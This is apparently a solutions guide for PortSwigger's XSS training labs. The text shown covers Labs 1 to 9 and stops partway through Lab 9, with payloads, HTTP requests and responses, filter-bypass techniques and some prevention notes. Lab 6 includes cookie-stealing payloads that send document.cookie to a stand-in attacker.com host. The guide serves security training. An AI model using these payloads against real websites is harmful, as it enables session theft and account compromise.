# PortSwigger XSS Labs - Complete Solutions Guide

## Overview

This comprehensive guide contains detailed solutions, payloads, and exploitation techniques for all 33 Cross-Site Scripting (XSS) labs from PortSwigger Web Security Academy.

**Total Labs**: 33
**Difficulty Distribution**:
- **Apprentice**: 9 labs (basic concepts)
- **Practitioner**: 18 labs (intermediate techniques)
- **Expert**: 6 labs (advanced exploitation)

**Lab Categories**:
- Reflected XSS (16 labs)
- Stored XSS (2 labs)
- DOM-based XSS (12 labs)
- XSS Exploitation (3 labs)

---

## Table of Contents

### Reflected XSS Labs
1. [Lab 1: Reflected XSS into HTML context with nothing encoded](#lab-1-reflected-xss-into-html-context-with-nothing-encoded)
2. [Lab 2: Reflected XSS into attribute with angle brackets HTML-encoded](#lab-2-reflected-xss-into-attribute-with-angle-brackets-html-encoded)
3. [Lab 3: Reflected XSS into JavaScript string](#lab-3-reflected-xss-into-javascript-string)
4. [Lab 4: Reflected XSS with angle brackets and double quotes HTML-encoded](#lab-4-reflected-xss-with-angle-brackets-and-double-quotes-html-encoded)
5. [Lab 5: Reflected XSS with single quote and backslash escaped](#lab-5-reflected-xss-with-single-quote-and-backslash-escaped)
6. [Lab 6: Reflected XSS into template literal](#lab-6-reflected-xss-into-template-literal)
7. [Lab 7: Reflected XSS in JavaScript URL with some characters blocked](#lab-7-reflected-xss-in-javascript-url-with-some-characters-blocked)
8. [Lab 8: Reflected XSS with event handlers and href attributes blocked](#lab-8-reflected-xss-with-event-handlers-and-href-attributes-blocked)
9. [Lab 9: Reflected XSS with some SVG markup allowed](#lab-9-reflected-xss-with-some-svg-markup-allowed)
10. [Lab 10: Reflected XSS with most tags and attributes blocked](#lab-10-reflected-xss-with-most-tags-and-attributes-blocked)
11. [Lab 11: Reflected XSS with all standard tags blocked](#lab-11-reflected-xss-with-all-standard-tags-blocked)
12. [Lab 12: Reflected XSS in canonical link tag](#lab-12-reflected-xss-in-canonical-link-tag)
13. [Lab 13: Reflected XSS protected by CSP with bypass](#lab-13-reflected-xss-protected-by-csp-with-bypass)
14. [Lab 14: Reflected XSS with very strict CSP and dangling markup](#lab-14-reflected-xss-with-very-strict-csp-and-dangling-markup)
15. [Lab 15: Reflected XSS with AngularJS sandbox escape without strings](#lab-15-reflected-xss-with-angularjs-sandbox-escape-without-strings)
16. [Lab 16: Reflected XSS with AngularJS sandbox escape and CSP](#lab-16-reflected-xss-with-angularjs-sandbox-escape-and-csp)

### Stored XSS Labs
17. [Lab 17: Stored XSS into HTML context with nothing encoded](#lab-17-stored-xss-into-html-context-with-nothing-encoded)
18. [Lab 18: Stored XSS into anchor href attribute](#lab-18-stored-xss-into-anchor-href-attribute)

### DOM-based XSS Labs
19. [Lab 19: DOM XSS in document.write sink](#lab-19-dom-xss-in-documentwrite-sink)
20. [Lab 20: DOM XSS in innerHTML sink](#lab-20-dom-xss-in-innerhtml-sink)
21. [Lab 21: DOM XSS in jQuery anchor href attribute](#lab-21-dom-xss-in-jquery-anchor-href-attribute)
22. [Lab 22: DOM XSS in jQuery selector with hashchange event](#lab-22-dom-xss-in-jquery-selector-with-hashchange-event)
23. [Lab 23: DOM XSS in document.write sink inside select element](#lab-23-dom-xss-in-documentwrite-sink-inside-select-element)
24. [Lab 24: DOM XSS in AngularJS expression](#lab-24-dom-xss-in-angularjs-expression)
25. [Lab 25: Reflected DOM XSS](#lab-25-reflected-dom-xss)
26. [Lab 26: Stored DOM XSS](#lab-26-stored-dom-xss)
27. [Lab 27: DOM XSS using web messages](#lab-27-dom-xss-using-web-messages)
28. [Lab 28: DOM XSS using web messages and JavaScript URL](#lab-28-dom-xss-using-web-messages-and-javascript-url)
29. [Lab 29: DOM XSS using web messages and JSON.parse](#lab-29-dom-xss-using-web-messages-and-jsonparse)
30. [Lab 30: DOM-based open redirection](#lab-30-dom-based-open-redirection)

### XSS Exploitation Labs
31. [Lab 31: Exploiting XSS to steal cookies](#lab-31-exploiting-xss-to-steal-cookies)
32. [Lab 32: Exploiting XSS to capture passwords](#lab-32-exploiting-xss-to-capture-passwords)
33. [Lab 33: Exploiting XSS to perform CSRF](#lab-33-exploiting-xss-to-perform-csrf)

---

## Reflected XSS Labs

### Lab 1: Reflected XSS into HTML context with nothing encoded

**URL**: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

**Difficulty**: Apprentice

**Objective**: Call `alert()` function

**Description**: This lab contains a simple reflected XSS vulnerability in the search functionality. User input from the search parameter is reflected directly into the HTML response without any encoding or sanitization.

**Vulnerability Analysis**:
- **Injection Point**: Search query parameter
- **Context**: HTML body content
- **Filter**: None
- **Encoding**: None

**Step-by-Step Solution**:

1. **Locate the Search Box**: Navigate to the lab homepage and identify the search functionality
2. **Test Basic Payload**: Enter the following payload in the search box:
   ```html
   <script>alert(1)</script>
   ```
3. **Submit the Search**: Click "Search" button
4. **Observe Execution**: The alert dialog executes, completing the lab

**HTTP Request**:
```http
GET /?search=<script>alert(1)</script> HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

**HTTP Response** (excerpt):
```html
<section class=blog-header>
    <h1>0 search results for '<script>alert(1)</script>'</h1>
</section>
```

**Key Payload**:
```html
<script>alert(1)</script>
```

**Burp Suite Workflow**:
1. Enable Burp Proxy intercept
2. Navigate to search page
3. Enter test payload
4. Observe request in Proxy → HTTP History
5. Send to Repeater for testing variations

**Alternative Payloads**:
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
```

**Common Mistakes**:
- Overthinking the solution - this is the simplest lab
- Not submitting the form properly
- Browser XSS auditor blocking (disable if using older browsers)

**Real-World Application**:
- Demonstrates the danger of directly reflecting user input
- Common in legacy applications without output encoding
- First step in XSS testing methodology

---

### Lab 2: Reflected XSS into attribute with angle brackets HTML-encoded

**URL**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded

**Difficulty**: Practitioner

**Objective**: Call `alert()` function

**Description**: This lab contains a reflected XSS vulnerability in the search functionality where angle brackets are HTML-encoded. The application reflects user input into an HTML attribute value but fails to sanitize quotes and event handlers.

**Vulnerability Analysis**:
- **Injection Point**: Search query parameter
- **Context**: HTML attribute value (quoted)
- **Filter**: Angle brackets (`<` `>`) are HTML-encoded
- **Encoding**: `<` → `&lt;`, `>` → `&gt;`
- **Vulnerability**: Quotes and attribute injection not blocked

**Step-by-Step Solution**:

1. **Initial Reconnaissance**:
   - Enter random test string: `test123`
   - Intercept request with Burp Suite
   - Send to Repeater

2. **Analyze Response**:
   ```html
   <input type="text" placeholder="Search..." value="test123">
   ```
   - Input reflected in `value` attribute

3. **Test Angle Bracket Encoding**:
   - Payload: `<script>alert(1)</script>`
   - Response: `&lt;script&gt;alert(1)&lt;/script&gt;`
   - Confirms angle brackets are encoded

4. **Break Out of Attribute**:
   - Payload: `"onmouseover="alert(1)`
   - This closes the `value` attribute and injects `onmouseover` event handler

5. **Construct Final URL**:
   ```
   https://YOUR-LAB-ID.web-security-academy.net/?search="onmouseover="alert(1)
   ```

6. **Trigger Execution**:
   - Copy URL to browser
   - Move mouse over the search input field
   - Alert executes

**HTTP Request**:
```http
GET /?search=%22onmouseover=%22alert(1) HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

**HTTP Response**:
```html
<input type="text" placeholder="Search..." value=""onmouseover="alert(1)">
```

**Rendered HTML Interpretation**:
```html
<input type="text" placeholder="Search..." value="" onmouseover="alert(1)">
```

**Key Payload**:
```
"onmouseover="alert(1)
```

**Payload Breakdown**:
- `"` - Closes the `value` attribute
- `onmouseover=` - Begins new event handler attribute
- `"alert(1)` - JavaScript to execute (note the quote)

**Burp Suite Workflow**:
1. Proxy → Intercept the search request
2. Send to Repeater (Ctrl+R)
3. Modify search parameter value
4. Send request (Ctrl+Space)
5. View response in Render tab to visualize

**Alternative Payloads**:
```html
" autofocus onfocus=alert(1) x="
" onclick=alert(1) x="
" onmouseenter=alert(1) "
' autofocus onfocus=alert(1) '
```

**Common Mistakes**:
- Not URL-encoding the payload properly
- Using angle brackets (they're encoded)
- Forgetting to move mouse over element to trigger event
- Testing in browsers with different event handler support

**Troubleshooting**:
- **Alert doesn't fire**: Ensure mouse moves over input element
- **Syntax error**: Check quote matching and attribute structure
- **Blocked by CSP**: This lab doesn't have CSP, so not applicable

**Real-World Application**:
- Common in search bars, form inputs, error messages
- Demonstrates importance of context-aware encoding
- HTML-encoding alone insufficient in attribute context
- Can be chained with social engineering (send malicious link)

---

### Lab 3: Reflected XSS into JavaScript string

**URL**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded

**Difficulty**: Practitioner

**Objective**: Break out of JavaScript string and call `alert()` function

**Description**: This lab contains a reflected XSS vulnerability where user input appears inside a JavaScript string variable. Angle brackets are HTML-encoded, preventing direct tag injection, but quote characters can terminate the string.

**Vulnerability Analysis**:
- **Injection Point**: Search query parameter
- **Context**: JavaScript string literal
- **Filter**: Angle brackets HTML-encoded
- **Encoding**: `<` → `&lt;`, `>` → `&gt;`
- **Vulnerability**: Quote characters not escaped in JavaScript context

**Step-by-Step Solution**:

1. **Initial Testing**:
   - Enter alphanumeric test string: `test123`
   - Intercept with Burp Suite
   - Send to Repeater

2. **Analyze JavaScript Context**:
   ```javascript
   <script>
   var searchTerm = 'test123';
   document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerm)+'">');
   </script>
   ```
   - Input reflected inside single-quoted JavaScript string

3. **Test Angle Bracket Encoding**:
   - Payload: `<script>alert(1)</script>`
   - Confirmed: Encoded as `&lt;script&gt;...`
   - Cannot break out with tags

4. **Break Out of String**:
   - Payload: `'-alert(1)-'`
   - First `'` closes the string
   - `-` acts as arithmetic operator
   - `alert(1)` executes
   - Second `-'` creates valid syntax

5. **URL Construction**:
   ```
   https://YOUR-LAB-ID.web-security-academy.net/?search='-alert(1)-'
   ```

6. **Verify in Browser**: Copy URL and load to trigger alert

**HTTP Request**:
```http
GET /?search=%27-alert(1)-%27 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

**HTTP Response**:
```javascript
<script>
var searchTerm = ''-alert(1)-'';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerm)+'">');
</script>
```

**JavaScript Execution Flow**:
```javascript
var searchTerm = '' - alert(1) - '';
// Evaluates as: empty string minus alert(1) minus empty string
// alert(1) executes as part of expression evaluation
```

**Key Payload**:
```javascript
'-alert(1)-'
```

**Payload Breakdown**:
- `'` - Terminates the JavaScript string
- `-` - Subtraction operator (allows statement continuation)
- `alert(1)` - JavaScript function call
- `-'` - Another subtraction and string start (maintains syntax)

**Burp Suite Workflow**:
1. Intercept search request
2. Send to Repeater
3. Test payload in search parameter
4. Examine response source code
5. Verify JavaScript syntax validity

**Alternative Payloads**:
```javascript
'; alert(1); //
'; alert(1)//
'+alert(1)+'
'/alert(1)//
```

**Alternative Techniques**:

**Using semicolon to terminate statement**:
```javascript
'; alert(1); //
```
Result:
```javascript
var searchTerm = ''; alert(1); //';
```

**Using comment to neutralize**:
```javascript
'; alert(1)//
```
Result:
```javascript
var searchTerm = ''; alert(1)//';
```

**Common Mistakes**:
- Not URL-encoding quotes
- Forgetting to close the string properly
- Invalid JavaScript syntax (causes parse error)
- Using angle brackets (they're encoded)

**Real-World Application**:
- Common in analytics scripts, tracking codes
- JavaScript context requires different payloads than HTML
- Demonstrates importance of context-aware output encoding
- Often found in inline scripts with user data

---

### Lab 4: Reflected XSS with angle brackets and double quotes HTML-encoded

**URL**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped

**Difficulty**: Practitioner

**Objective**: Break out of JavaScript string when single quotes are escaped but backslashes are not

**Description**: This lab demonstrates a more sophisticated JavaScript string context where single quotes get backslash-escaped, but the backslash character itself is not filtered. This allows escaping the escape character.

**Vulnerability Analysis**:
- **Injection Point**: Search query parameter
- **Context**: Single-quoted JavaScript string
- **Filter**:
  - Angle brackets: HTML-encoded
  - Double quotes: HTML-encoded
  - Single quotes: Backslash-escaped (`'` → `\'`)
- **Vulnerability**: Backslash character not escaped

**Step-by-Step Solution**:

1. **Initial Testing**:
   - Enter test string with quote: `test'quote`
   - Intercept with Burp Suite
   - Send to Repeater

2. **Observe Escape Behavior**:
   ```javascript
   var searchTerm = 'test\'quote';
   ```
   - Single quote is escaped with backslash

3. **Test Backslash Handling**:
   - Payload: `test\payload`
   - Observe: Backslash not escaped
   - Key insight: We can escape the backslash itself

4. **Exploit Technique**:
   - Payload: `\'-alert(1)//`
   - First `\` escapes the application's escaping backslash
   - This creates `\\` (escaped backslash)
   - Then `'` becomes unescaped and closes the string

5. **Final URL**:
   ```
   https://YOUR-LAB-ID.web-security-academy.net/?search=\'-alert(1)//
   ```

6. **Verify**: Load URL in browser

**HTTP Request**:
```http
GET /?search=%5C%27-alert(1)// HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

**HTTP Response**:
```javascript
<script>
var searchTerm = '\\'-alert(1)//';
</script>
```

**JavaScript Interpretation**:
```javascript
var searchTerm = '\\' - alert(1)//';
// First part: '\\' is a string containing single backslash
// Then: - alert(1) executes
// Finally: // comments out the rest
```

**Key Payload**:
```javascript
\'-alert(1)//
```

**Payload Breakdown**:
- `\` - Escapes the application's escaping backslash
- `'` - Closes the JavaScript string
- `-alert(1)` - Executes alert with arithmetic operator
- `//` - Comments out remaining quote

**Burp Suite Workflow**:
1. Intercept search request
2. Send to Repeater
3. Test various escape sequences
4. Examine JavaScript in response
5. Verify syntax validity

**Why This Works**:

**Application's escaping logic**:
```
Input:  \'
Step 1: Application escapes single quote
Step 2: \' becomes \\'
Result: \\' in output
```

**JavaScript parsing**:
```
var searchTerm = '\\' - alert(1)//';
                  ^^^ this is a complete string with one backslash
                     ^ string ends here
                        ^^^^^^^^^ code executes
                                  ^^ comment to end of line
```

**Alternative Payloads**:
```javascript
\';alert(1)//
\'+alert(1)//
\';alert(1);
```

**Common Mistakes**:
- Not understanding double-escaping behavior
- URL-encoding issues with backslash
- Testing in browser console (different escaping rules)
- Assuming single escape is sufficient

**Troubleshooting**:
- **Syntax error**: Check backslash and quote placement
- **Doesn't execute**: Verify // comment works in context
- **URL encoding**: Backslash is `%5C`, single quote is `%27`

**Real-World Application**:
- Common in applications with incomplete escaping logic
- Demonstrates importance of escaping escape characters
- Shows why blacklist approaches fail
- Relevant in any language with escape sequences

---

### Lab 5: Reflected XSS with single quote and backslash escaped

**URL**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped

**Difficulty**: Practitioner

**Objective**: Break out of script context when both quotes and backslashes are escaped

**Description**: This lab has more robust JavaScript string escaping where both single quotes AND backslashes are escaped. However, the application doesn't prevent breaking out of the `<script>` tag entirely.

**Vulnerability Analysis**:
- **Injection Point**: Search query parameter
- **Context**: JavaScript string within `<script>` tags
- **Filter**:
  - Single quotes: Backslash-escaped
  - Backslashes: Backslash-escaped
  - Angle brackets: NOT encoded in JavaScript context
- **Vulnerability**: Can close script tag and inject new one

**Step-by-Step Solution**:

1. **Initial Testing**:
   - Enter test with quote: `test'payload`
   - Intercept with Burp Suite
   - Send to Repeater

2. **Test Quote Escaping**:
   ```javascript
   var searchTerm = 'test\'payload';
   ```
   - Single quotes are escaped

3. **Test Backslash Escaping**:
   - Payload: `test\payload'test`
   - Response: `test\\payload\'test`
   - Both backslash and quote escaped
   - Cannot use previous technique

4. **Identify Alternative**:
   - Realize we're inside `<script>` tags
   - HTML parsing happens BEFORE JavaScript parsing
   - Can close the `<script>` tag directly

5. **Craft Payload**:
   ```html
   </script><script>alert(1)</script>
   ```

6. **Final URL**:
   ```
   https://YOUR-LAB-ID.web-security-academy.net/?search=</script><script>alert(1)</script>
   ```

7. **Verify**: Load in browser

**HTTP Request**:
```http
GET /?search=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

**HTTP Response**:
```html
<script>
var searchTerm = '</script><script>alert(1)</script>';
document.write('...');
</script>
```

**HTML Parsing Behavior**:
```html
<!-- Browser sees this: -->
<script>
var searchTerm = '
</script>  <!-- Script ends here for HTML parser -->

<script>alert(1)</script>  <!-- New script executes -->

';  <!-- Orphaned text, ignored -->
document.write('...');
</script>  <!-- Closes the orphaned script -->
```

**Key Payload**:
```html
</script><script>alert(1)</script>
```

**Payload Breakdown**:
- `</script>` - Closes the current script tag (HTML level)
- `<script>` - Opens new script tag
- `alert(1)` - JavaScript to execute
- `</script>` - Closes injected script tag

**Burp Suite Workflow**:
1. Test character escaping systematically
2. Identify that HTML tags work in JavaScript context
3. Use Repeater to test closing tag
4. Examine HTML structure in response
5. Verify with browser

**Why This Works**:

**HTML Parser vs JavaScript Parser**:
- HTML parser processes document FIRST
- Finds `</script>` and closes the script block
- JavaScript parser never sees our payload as string data
- Second `<script>` block executes independently

**This demonstrates a fundamental principle**:
> HTML parsing precedence over JavaScript parsing in `<script>` blocks

**Alternative Payloads**:
```html
</script><img src=x onerror=alert(1)>
</script><svg onload=alert(1)>
</script><body onload=alert(1)>
```

**Common Mistakes**:
- Trying to escape within JavaScript context
- Not URL-encoding angle brackets
- Missing closing `</script>` tag
- Testing in JavaScript console (different context)

**Troubleshooting**:
- **Doesn't execute**: Check URL encoding
- **Syntax error**: Ensure proper tag closure
- **CSP blocks**: This lab has no CSP
- **Browser blocks**: Disable XSS auditor in old browsers

**Real-World Application**:
- Shows limits of string-level escaping
- Demonstrates need for context-aware encoding
- HTML-escaping angle brackets would prevent this
- Common in applications with layered security

---

### Lab 6: Reflected XSS into template literal

**URL**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped

**Difficulty**: Practitioner

**Objective**: Execute JavaScript within template literal

**Description**: This lab reflects user input into a JavaScript template literal (ES6 backtick strings). Despite extensive character encoding, template literals allow expression evaluation through `${}` syntax.

**Vulnerability Analysis**:
- **Injection Point**: Search query parameter
- **Context**: JavaScript template literal (backticks)
- **Filter**: Extensive - angle brackets, quotes, backslashes, backticks Unicode-escaped
- **Vulnerability**: `${}` expression interpolation not blocked

**Step-by-Step Solution**:

1. **Initial Reconnaissance**:
   - Enter test string: `test123`
   - Intercept with Burp Suite
   - Send to Repeater

2. **Identify Template Literal Context**:
   ```javascript
   <script>
   var message = `0 search results for 'test123'`;
   document.getElementById('searchMessage').innerText = message;
   </script>
   ```
   - Note the backticks (template literal)

3. **Test Character Encoding**:
   - Payload: `<script>'"\`alert(1)`
   - Observe: All special chars encoded/escaped
   - Cannot use traditional escapes

4. **Exploit Template Literal Feature**:
   - Payload: `${alert(1)}`
   - Template literals evaluate `${}` expressions
   - No escaping applied to this syntax

5. **Final URL**:
   ```
   https://YOUR-LAB-ID.web-security-academy.net/?search=${alert(1)}
   ```

6. **Verify**: Load URL in browser

**HTTP Request**:
```http
GET /?search=${alert(1)} HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

**HTTP Response**:
```javascript
<script>
var message = `0 search results for '${alert(1)}'`;
document.getElementById('searchMessage').innerText = message;
</script>
```

**Template Literal Evaluation**:
```javascript
var message = `0 search results for '${alert(1)}'`;
// ${alert(1)} is evaluated as JavaScript expression
// alert(1) executes during string construction
// Result is converted to string for concatenation
```

**Key Payload**:
```javascript
${alert(1)}
```

**Payload Breakdown**:
- `${` - Begins expression interpolation in template literal
- `alert(1)` - JavaScript expression to evaluate
- `}` - Ends expression interpolation

**Burp Suite Workflow**:
1. Identify template literal in JavaScript source
2. Test various escape sequences
3. Try expression interpolation syntax
4. Verify execution in Render tab
5. Copy working URL to browser

**Template Literal Features**:

**Expression Interpolation**:
```javascript
`String ${expression} more string`
// Any JavaScript expression inside ${}
```

**Examples**:
```javascript
${alert(1)}                    // Function call
${alert(document.domain)}      // With parameter
${console.log('XSS')}         // Different function
${eval('alert(1)')}           // Eval execution
${window.location='//evil'}    // Redirect
```

**Alternative Payloads**:
```javascript
${alert(document.cookie)}
${alert(document.domain)}
${console.log(document.cookie)}
${window.onerror=alert;throw 1}
```

**Advanced Exploitation**:
```javascript
${fetch('//attacker.com?c='+document.cookie)}
${new Image().src='//attacker.com/steal?'+document.cookie}
```

**Common Mistakes**:
- Using traditional string escaping techniques
- Not recognizing template literal syntax
- Forgetting URL encoding for special chars
- Testing in non-ES6 environments

**Troubleshooting**:
- **Doesn't execute**: Verify template literal context
- **Syntax error**: Check ${} brackets match
- **Encoding issues**: Use Burp's URL encoder
- **Browser support**: Template literals require ES6

**Real-World Application**:
- Modern JavaScript applications using ES6+
- Developers may not realize template literals need special handling
- Demonstrates danger of interpolation features
- Common in Node.js server-side rendering

**Prevention**:
- Never put untrusted data in template literals
- Use proper escaping libraries that understand template literals
- Validate and sanitize all user input
- Use Content Security Policy

---

### Lab 7: Reflected XSS in JavaScript URL with some characters blocked

**URL**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked

**Difficulty**: Expert

**Objective**: Exploit JavaScript URL context with character restrictions

**Description**: This expert-level lab demonstrates reflected XSS in a JavaScript URL context with significant character filtering. The solution requires understanding exception handling, arrow functions, and string conversion.

**Vulnerability Analysis**:
- **Injection Point**: `postId` parameter in back-to-blog functionality
- **Context**: JavaScript URL in onclick handler
- **Filter**: Multiple characters blocked (parentheses, quotes, etc.)
- **Technique**: Exception-based execution with object notation

**Step-by-Step Solution**:

1. **Locate Vulnerability**:
   - Visit a blog post
   - Examine "Back to Blog" link in Burp Proxy
   - Identify onclick handler with JavaScript URL

2. **Analyze Vulnerable Code**:
   ```html
   <a onclick="javascript:location='/post?postId=5'">Back to Blog</a>
   ```

3. **Understand Restrictions**:
   - Test various payloads to identify blocked characters
   - Parentheses, quotes, and other chars filtered

4. **Deploy Complex Payload**:
   ```
   %27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
   ```

5. **Construct Full URL**:
   ```
   https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
   ```

6. **Trigger Execution**: Click "Back to Blog" link

**HTTP Request**:
```http
GET /post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:' HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

**Rendered JavaScript** (decoded):
```javascript
javascript:location='/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''
```

**Key Payload** (decoded):
```javascript
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

**Payload Breakdown**:

1. `'}` - Closes the location string and object context
2. `,x=x=>` - Creates arrow function assigned to x
3. `{throw/**/onerror=alert,1337}` - Function body:
   - `throw` keyword triggers exception
   - `/**/` blank comment bypasses space restrictions
   - `onerror=alert` assigns alert to window.onerror
   - `,1337` value thrown as exception
4. `toString=x` - Assigns function to toString method
5. `window+''` - Triggers toString conversion (implicit)
6. `,{x:'` - Maintains valid syntax

**Execution Flow**:

```javascript
// Step 1: Arrow function definition
x = x => { throw onerror=alert, 1337 }

// Step 2: Assign function to toString
toString = x

// Step 3: Force string conversion
window + ''  // Calls window.toString()

// Step 4: toString executes arrow function
// Step 5: throw statement executes
// Step 6: onerror=alert assigns alert to window.onerror
// Step 7: Thrown value 1337 triggers onerror handler
// Step 8: alert(1337) executes
```

**Burp Suite Workflow**:
1. Intercept blog post request
2. Examine "Back to Blog" link onclick attribute
3. Test character restrictions systematically
4. Use Repeater to refine payload
5. Deploy via URL manipulation

**Why This Works**:

**Exception-Based Execution**:
- `throw` triggers error handling
- `onerror` event handler catches exception
- Allows function call without parentheses

**Arrow Function Syntax**:
```javascript
x => { code }  // No function keyword needed
```

**toString Exploitation**:
- Any object-to-string conversion calls toString()
- `window + ''` forces conversion
- toString method can contain arbitrary code

**Comment as Space**:
- `/**/` acts as whitespace
- Bypasses space-character filters

**Alternative Payloads** (context-dependent):
```javascript
// Using onerror with different techniques
'},onerror=alert;throw 1337//

// Using eval alternatives
'},eval.call(this,atob('YWxlcnQoMSk='))//
```

**Common Mistakes**:
- Not URL-encoding the payload properly
- Missing the "Back to Blog" trigger
- Incorrect quote matching
- Breaking JavaScript syntax

**Troubleshooting**:
- **No execution**: Verify URL encoding
- **Syntax error**: Check object/function syntax
- **Blocked chars**: Test each character individually
- **Not triggered**: Must click the link

**Real-World Application**:
- Demonstrates advanced JavaScript exploitation
- Shows limits of character blacklisting
- Relevant in heavily filtered contexts
- Used when traditional techniques fail

**Prevention**:
- Use URL allow-listing, not blacklisting
- Encode ALL data in JavaScript URL context
- Avoid JavaScript URLs entirely
- Use Content Security Policy
- Validate scheme (http/https only)

---

### Lab 8: Reflected XSS with event handlers and href attributes blocked

**URL**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked

**Difficulty**: Expert

**Objective**: Execute XSS when event handlers and href attributes are blocked

**Description**: This expert lab blocks standard event handlers and anchor href attributes but fails to block SVG's animate element, which can dynamically manipulate attributes.

**Vulnerability Analysis**:
- **Injection Point**: Search query parameter
- **Context**: HTML body
- **Filter**: Most event handlers and href attributes blocked
- **Bypass**: SVG animate element not blocked

**Step-by-Step Solution**:

1. **Test Standard Payloads**:
   - Try: `<img src=x onerror=alert(1)>`
   - Result: Blocked by WAF
   - Try: `<a href="javascript:alert(1)">click</a>`
   - Result: href attribute blocked

2. **Identify SVG as Alternative**:
   - SVG elements may bypass filters
   - SVG has animation capabilities

3. **Craft SVG Animate Payload**:
   ```html
   <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>
   ```

4. **URL-Encode and Deploy**:
   ```
   https://YOUR-LAB-ID.web-security-academy.net/?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>
   ```

5. **Trigger**: Click the "Click me" text

**HTTP Request**:
```http
GET /?search=%3Csvg%3E%3Ca%3E%3Canimate%20attributeName%3Dhref%20values%3Djavascript%3Aalert(1)%20/%3E%3Ctext%20x%3D20%20y%3D20%3EClick%20me%3C/text%3E%3C/a%3E%3C/svg%3E HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

**HTTP Response**:
```html
<section class=blog-header>
<h1>0 search results for '<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>'</h1>
</section>
```

**Key Payload**:
```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>
```

**Payload Breakdown**:
- `<svg>` - Opens SVG context
- `<a>` - Creates anchor element within SVG
- `<animate>` - SVG animation element
- `attributeName=href` - Specifies which attribute to animate
- `values=javascript:alert(1)` - Sets href value (bypasses direct href blocking)
- `/>`- Closes animate tag
- `<text x=20 y=20>Click me</text>` - Visible clickable text
- `</a></svg>` - Closes tags

**How It Works**:

**SVG Animate Behavior**:
1. Animate element manipulates parent element attributes
2. Sets `href` attribute dynamically
3. Bypasses static href attribute filters
4. `values` attribute not in filter blacklist

**Why Filters Fail**:
- Filter checks for `href=` in initial HTML
- Doesn't account for dynamic attribute manipulation
- SVG animation features overlooked
- Blacklist approach incomplete

**Burp Suite Workflow**:
1. Use Intruder to test blocked tags/attributes
2. Identify SVG elements that pass filter
3. Test SVG-specific features
4. Refine payload in Repeater
5. Verify rendering in browser

**Alternative SVG Techniques**:
```html
<!-- Using set element -->
<svg><a><set attributeName=href to=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>

<!-- Using animateTransform -->
<svg><a id=x><animateTransform attributeName=href values=javascript:alert(1)></a>

<!-- Using direct manipulation -->
<svg><a href=""><animate attributeName=href values=javascript:alert(1) /></a></svg>
```

**Common Mistakes**:
- Forgetting the text element (nothing to click)
- Not including "Click me" or visible content
- Syntax errors in SVG structure
- Missing URL encoding

**Troubleshooting**:
- **Nothing visible**: Add text element with coordinates
- **Not clickable**: Ensure text is within `<a>` tag
- **Blocked**: Test if animate element specifically allowed
- **Doesn't execute**: Verify JavaScript URL scheme

**Real-World Application**:
- Shows complexity of comprehensive filtering
- SVG has many obscure features
- Blacklist approaches miss edge cases
- Important for bypass techniques

**Prevention**:
- Whitelist approach for tags
- Block all SVG animation elements
- Content Security Policy
- HTML sanitization library
- Remove SVG entirely if not needed

---

### Lab 9: Reflected XSS with some SVG markup allowed

**URL**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed

**Difficulty**: Practitioner

**Objective**: Use Burp Intruder to identify allowed SVG tags and exploit them

**Description**: This lab demonstrates systematic enumeration of allowed tags and attributes using Burp Suite's Intruder tool. The WAF blocks most tags but misses specific SVG elements.

**Vulnerability Analysis**:
- **Injection Point**: Search query parameter
- **Context**: HTML body
- **Filter**: WAF blocking most tags and attributes
- **Methodology**: Systematic enumeration required

**Step-by-Step Solution**:

**Phase 1: Confirm Filtering**

1. **Test Basic Payload**:
   ```html
   <img src=1 onerror=alert(1)>
   ```
2. **Response**: HTTP 400 - Blocked
3. **Conclusion**: WAF active

**Phase 2: Enumerate Allowed Tags**

4. **Burp Intruder Setup**:
   - Right-click request → Send to Intruder
   - Clear all payload markers (§)
   - Set injection point: `/?search=<§§>`
   - Attack type: Sniper

5. **Load Payloads**:
   - Payload type: Simple list
   - Copy tags from XSS cheat sheet:
   ```
   script
   img
   svg
   body
   iframe
   object
   embed
   animate
   animatetransform
   title
   image
   ```

6. **Run Attack**:
   - Click "Start attack"
   - Sort by Status Code column

7. **Analysis Results**:
   - Status 400: Blocked tags
